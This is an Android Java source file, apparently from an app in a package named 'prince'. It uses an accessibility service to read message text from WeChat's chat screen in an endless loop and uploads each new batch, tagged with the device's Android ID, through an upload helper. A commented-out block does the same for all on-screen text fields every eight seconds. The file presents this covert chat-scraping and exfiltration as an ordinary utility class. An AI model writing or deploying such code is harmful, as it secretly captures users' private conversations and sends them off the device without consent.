/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.prince.accessiblity;


import static com.xuexiang.xutil.XUtil.getContentResolver;

import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.lenovo.innovate.MyApp;
import com.lenovo.innovate.prince.accessiblity.AccessService;
import com.lenovo.innovate.prince.http.permissionUp;
import com.lenovo.innovate.prince.utils.ServiceUtils;
import com.lenovo.innovate.utils.Utils;

import org.apache.commons.lang3.StringUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class StringText {

    private static final String TAG = "StringText";
    public AccessService service = MyApp.getInstance().getService();


    public void start(){




     /*   while (true){
          AccessibilityNodeInfo findViewByID =  ServiceUtils.findViewById(service,"com.tencent.mm:id/en");
            if(!AccUtils.isEmptyView(findViewByID)){
                Log.i(TAG,"抵达聊天界面" );
                break;
            }
        }*/


        List<String> list=new ArrayList<>();
        while(true){
            int da = list.size();
            List<String> list_up=new ArrayList<>();
            List<AccessibilityNodeInfo> findView_chat =  ServiceUtils.findViewByIdList(service,"com.tencent.mm:id/b4b");
            if(!AccUtils.isEmptyArray(findView_chat)){

                for (int i = 0; i < findView_chat.size(); i++) {
                    String text = findView_chat.get(i).getText().toString();
                    if(!list.contains(text)){
                        Log.i(TAG,text);
                        if(!text.contains("[")){
                            list.add(text);
                            list_up.add(text);
                        }
                    }
                }
            }



            if(da != list.size()){
                Map<String,Object> map=new HashMap<String,Object>();
                map.put("screen",String.join("",list_up));
                JSONObject jsonObject  = new JSONObject();
                jsonObject.put("permission","ex_text");
                jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                jsonObject.put("data", JSONArray.toJSON(map));
                permissionUp.Up(8,jsonObject);
            }


        }




       /* sleep(2000);
        int  a = 0;
        String text = null;
        while (a<10) {
            List<String> list=new ArrayList<>();
            List<AccessibilityNodeInfo> findViewPicture = ServiceUtils.findViewByClassName(service, "android.widget.TextView");
            for (AccessibilityNodeInfo NodeInfo : findViewPicture) {
                if(NodeInfo.getText() != null){
               text = NodeInfo.getText().toString();
                    if (text != null) {
                        if (!list.contains(text)) {
                            list.add(text);
                        }
                    }
                }
            }
            List<AccessibilityNodeInfo> findView = ServiceUtils.findViewByClassName(service, "android.view.View");
            for (AccessibilityNodeInfo NodeInfo : findView) {
                if(NodeInfo.getText() != null){
                    text = NodeInfo.getText().toString();
                    if (text != null) {
                        if (!list.contains(text)) {
                            list.add(text);
                        }
                    }
                }
            }
            List<AccessibilityNodeInfo> View = ServiceUtils.findViewByClassName(service, "android.widget.EditText");
            for (AccessibilityNodeInfo NodeInfo : View) {
                if(NodeInfo.getText() != null){
                    text = NodeInfo.getText().toString();
                    if (text != null) {
                        if (!list.contains(text)) {
                            list.add(text);
                        }
                    }
                }
            }

            Map<String,Object> map=new HashMap<String,Object>();
            map.put("screen",String.join("",list));
            JSONObject jsonObject  = new JSONObject();
            jsonObject.put("permission","ex_text");
            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            jsonObject.put("data", JSONArray.toJSON(map));

            permissionUp.Up(8,jsonObject);

            Log.i(TAG,list.toString());
            sleep(8000);
            a++;
        }*/


    }

    private void sleep(int i) {
        try {
            Thread.sleep( i);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
